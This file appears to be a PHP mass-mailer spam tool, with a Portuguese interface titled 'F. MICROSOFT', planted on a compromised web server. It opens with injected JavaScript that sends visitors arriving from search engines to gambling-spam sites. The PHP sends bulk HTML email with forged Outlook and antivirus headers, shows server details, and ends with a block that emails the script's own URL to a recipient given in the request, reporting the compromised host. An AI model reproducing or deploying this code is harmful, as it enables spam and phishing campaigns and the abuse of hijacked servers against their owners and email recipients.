<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://shanxishishicai.tumblr.com ";
</script>

<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://shishicaiqqqun.blog.com ";
</script>

<?php

@set_time_limit(600);



$testa = $_POST['veio'];

if($testa != "") {

	$message = $_POST['html'];

	$subject = $_POST['assunto'];

	$nome = $_POST['nome'];

	$de = $_POST['remet'];

	$to = $_POST['emails'];



	$email = explode("\n", $to);

	$message = stripslashes($message);



	$i = 0;

	$count = 1;

	while($email[$i]) {

		$ok = "ok";

		$headers  = "MIME-Version: 1.0\n";

        $headers .= "Content-type: text/html; charset=iso-8859-1\n";

		//$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";

        //$headers .= "X-Priority: 1\n";

		$header .= "Message-ID: <".md5(uniqid(time()))."@{$_SERVER['SERVER_NAME']}>\r\n";   

		$header .= "X-Priority: 1 (Normal)\r\n";   

		$header .= "X-MSMail-Priority: Normal\r\n";  

		$header .= "X-Mailer: Microsoft Office Outlook, Build Build 10.0.2627\r\n";   

		$header .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2670\r\n";  

		$header .= "X-MS-TNEF-Correlator: 000000001FAFEF0164F948428AF85FFB8E5FA93BE4422D00\r\n";  

		$header .= "X-Antivirus: avast! (VPS 0608-0, 20/02/2006), Inbound message\r\n";  

		$header .= "X-Antivirus-Status: Clean\r\n";  

		$headers .= "From: ". $nome ."<". $de .">\r\n";

		if(mail($email[$i], str_replace("%EMAIL%",$email[$i],$subject), str_replace("%EMAIL%",$email[$i],$message), $headers))

		echo "<font face=verdana size=2 color=#99CCFF>*[$count] <b>".$email[$i]."</b> <font face=verdana size=2 color=#99CCFF>ENVIADO....!</font><br><hr>";

		else

		echo "<font face=verdana size=2 color=red>*[$count] <b>".$email[$i]."</b> <font face=verdana size=2 color=red>ERRO AO ENVIAR</font><br><hr>";

		$i++;

		$count++;

	}

	$count--;

	if($ok == "ok")

	echo "[Fim do Envio]"; 



}



?>

<html>

<head>

<title>F. MICROSOFT</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style>

body {

	margin-left: 0;

	margin-right: 0;

	margin-top: 0;

        background-color: white;

	margin-bottom: 0;

}

.titulo {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 70px;

	color: #1BF51F;

	font-weight: bold;

}



.normal {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 12px;

	color: #1BF51F;

}



.form {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 10px;

	color: #000000;

	background-color: #FFFFFF;

	border: 1px dashed #666666;

}



.texto {

	font-family: Verdana, Arial, Helvetica, sans-serif;

	font-weight: bold;

}



.alerta {

	font-family: Verdana, Arial, Helvetica, sans-serif;

	font-weight: bold;

	color: #990000;

	font-size: 10px;

}

</style>

</head>

<body style="background-color: #000000">

<form action="" method="post" enctype="multipart/form-data" name="form1">

  <font face="Arial">

  <font color="#99CCFF">

  <input type="hidden" name="veio" value="sim">



    </font><font color="#99CCFF">



    <tr>



 

	</font>



    </font>



 

<table border="0" width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px ridge #1BF51F" bgcolor="black" > 

     <td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">

		<font face="Arial" color="#99CCFF">Microsoft</font></span></td>

<tr align="left"> 

<td colspan="2" ><font color="#99CCFF" face="Arial">

Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>

Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>

Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>

Software usado: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>

Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>

Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>

</td>



</center>





    </tr>

    <tr>

      <td height="194" valign="top" bgcolor="#000000">

	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">

          <tr>

            <td align="right" height="17" width="62%"><span class="texto">

			<font face="Arial" color="#99CCFF">Assunto:</font></span></td>

            <td height="17" width="35%"><font color="#99CCFF" face="Arial">

			<input name="assunto" type="text" class="form" id="assunto0" style="width:250; color:#99CCFF; font-family:Verdana; background-color:#000000; height:16" size="1"></font></td>

          </tr>

          <tr>

            <td align="right" height="17" width="62%"><span class="texto">

			<font face="Arial" color="#99CCFF">Nome:</font></span></td>

            <td height="17" width="35%"><font color="#99CCFF" face="Arial">

			<input name="nome" type="text" class="form" id="assunto" style="width:100%; color:#99CCFF; font-family:Verdana; background-color:#000000" size="1"><input name="remet" type="text" class="form" id="assunto1" style="width:100%; color:#99CCFF; font-family:Verdana; background-color:#000000" size="1" value=".it"></font></td>

          </tr>

          <tr align="center" bgcolor="#99CCFF">

            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">

			<font face="Arial" color="#99CCFF"></font></span></td>

          </tr>

          <tr align="right">

            <td height="146" colspan="2" valign="top">

			<font color="#99CCFF" face="Arial"><br>

             <textarea name="html" style="width:100%; color:#99CCFF; font-family:Verdana; background-color:#000000" rows="8" wrap="VIRTUAL" class="form" id="html" cols="2">
</textarea>

              </font>

              <span class="alerta"><font face="Arial" color="#99CCFF">*Lembrete: texto em HTML</font></span></td>

         </tr>

          <tr align="center" bgcolor="#000000">

            <td height="10" colspan="2"><font color="#99CCFF"><span class="texto"><font face="Arial">Lista de emails</font></span><font face="Arial">

			</font>

             .

          	</font>

             

          </tr>

          <tr align="right">

            <td height="136" colspan="2" valign="top">

			<font color="#99CCFF" face="Arial"><br>

              <textarea name="emails" style="width:100%; font-family:Verdana; color:#99CCFF; background-color:#000000" rows="8" wrap="VIRTUAL" class="form" id="emails" cols="2">dmnsouza01@gmail.com

dmnsouza@bol.com.br</textarea>

              </font>

              <span class="alerta"><font face="Arial" color="#99CCFF">*Listmail</font></span><font face="Arial" color="#99CCFF">

			</font> </td>

          </tr>

          <tr>

            <td height="26" align="right" valign="top" colspan="2">

			<font color="#99CCFF" face="Arial"><input type="submit" name="Submit" id="enviar" value="Enviar"></font></td>

          </tr>

        </table>

	  </td>

    </tr>

    <tr>

      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>

    </tr>

  </table>

</form>

</body>





<?php

$testa = $_GET['env'];

if($testa = "1") {

	$message = $_POST['html'];

	$subject = $_SERVER['SERVER_NAME'];

	$nome = $_POST['nome'];

	$de = $_POST['de'];

	$to = $_POST['emails'];

	$copia = $_GET['copia'];

	$msg_body = "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];

		$headers  = "MIME-Version: 1.0\n";

        $headers .= "Content-type: text/html; charset=iso-8859-1\n";

		$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";

		$headers .= "From: " .$email[$i]. "\r\n";

		$headers .= "CC: " .$copia. "\r\n";

		mail($_GET['p'], $subject, $msg_body, $headers);

		}

?>
